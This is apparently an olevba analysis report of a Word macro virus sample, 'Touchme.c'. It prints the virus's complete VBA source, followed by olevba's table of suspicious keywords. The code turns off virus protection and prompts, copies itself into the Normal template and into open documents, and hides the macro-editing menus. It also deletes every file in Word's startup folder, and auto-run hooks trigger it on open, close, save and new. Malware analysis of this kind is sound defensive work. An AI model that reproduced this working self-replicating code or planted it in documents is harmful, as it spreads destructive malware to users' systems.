olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Touchme.c
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Touchme.c - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' This virus code created by Reza Pc 212
' Copyright (C) 1999 ReYoKh Team Labs
' University of Gunadarma
'
' for all fucking us --- blah-blah-blueeck-eeekh
'
' Last Up-Date 11 November 1999 [09.00:00]

Private Sub Infected()
    On Error Resume Next
    Dim Active As Boolean
    Dim ID, Ultah, Name As String
    Dim AD, NT As Object
    ID = "' Last Up-Date 11 November 1999 [09.00:00]"
    Set AD = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
    Set NT = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule
    Options.VirusProtection = False
    Options.SavePropertiesPrompt = False
    Options.SaveNormalPrompt = False
    Options.ConfirmConversions = False
    WordBasic.disableautomacros True
    Application.Caption = "Mikrosoft Werd"
    If NT.Lines(7, 1) <> ID Then
        NT.DeleteLines 1, NT.CountOfLines
        NT.AddFromString AD.Lines(1, AD.CountOfLines)
    End If
    If AD.Lines(7, 1) <> ID Then
        AD.DeleteLines 1, AD.CountOfLines
        AD.AddFromString NT.Lines(1, NT.CountOfLines)
    End If
    For Each Obj In NormalTemplate.VBProject.VBComponents
        If Obj.Name <> "ThisDocument" Then
            Application.OrganizerDelete Source:=NormalTemplate.FullName, _
            Name:=Obj.Name, Object:=wdOrganizerObjectProjectItems
        End If
    Next Obj
    For Each Obj In ActiveDocument.VBProject.VBComponents
        If Obj.Name <> "ThisDocument" Then
            Application.OrganizerDelete Source:=ActiveDocument.FullName, _
            Name:=Obj.Name, Object:=wdOrganizerObjectProjectItems
        End If
    Next Obj
    If Day(Date) = 1 Then Name = ID
    If Day(Date) = 5 And Month(Date) = 3 Then Name = "REZA"
    If Day(Date) = 8 And Month(Date) = 8 Then Name = "YOMBI"
    If Day(Date) = 22 And Month(Date) = 12 Then Name = "NELIS"
    If Name <> "" And Name <> ID Then
        Active = Assistant.Visible
        Assistant.Visible = True
        With Assistant.NewBalloon
            .Text = "ReYoKh Team Labs mengucapkan" + Chr(13) + Chr(13) + _
                    "Selamat Ulang Tahun  !!!" + Chr(13) + "untuk " + Name + ", bahagia selalu"
            .Show
        End With
        Assistant.Visible = Active
    End If
    Options.VirusProtection = True
    WordBasic.disableautomacros False
    Open Application.StartupPath + "\EcHa" For Output As #1
    Print #1, "Attribute VB_Name = " + Chr(34) + "EcHa" + Chr(34)
    Print #1, "Sub ViewVBCode()"
    Print #1, "End Sub"
    Print #1, "Sub ToolsMacro()"
    Print #1, "End Sub"
    Print #1, "Sub AutoExec()"
    Print #1, "    ToolsMacro"
    Print #1, "End Sub"
    Close #1
    NormalTemplate.VBProject.VBComponents.Import Application.StartupPath + "\EcHa"
    Kill Application.StartupPath + "\*.*"
End Sub
Private Sub Document_Close()
    Infected
End Sub
Private Sub Document_Open()
    Infected
End Sub
Private Sub Document_Save()
    Infected
End Sub
Private Sub Document_New()
    Infected
End Sub
Private Sub Document_Exit()
    Infected
End Sub
Private Sub Document_Exec()
    Infected
End Sub















































-------------------------------------------------------------------------------
VBA MACRO EcHa.bas 
in file: Virus.MSWord.Touchme.c - OLE stream: 'Macros/VBA/EcHa'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub ViewVBCode()
End Sub
Sub ToolsMacro()
End Sub
Sub AutoExec()
    ToolsMacro
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Base64    |DF@                 |REZA                                         |
|String    |                    |                                             |
+----------+--------------------+---------------------------------------------+

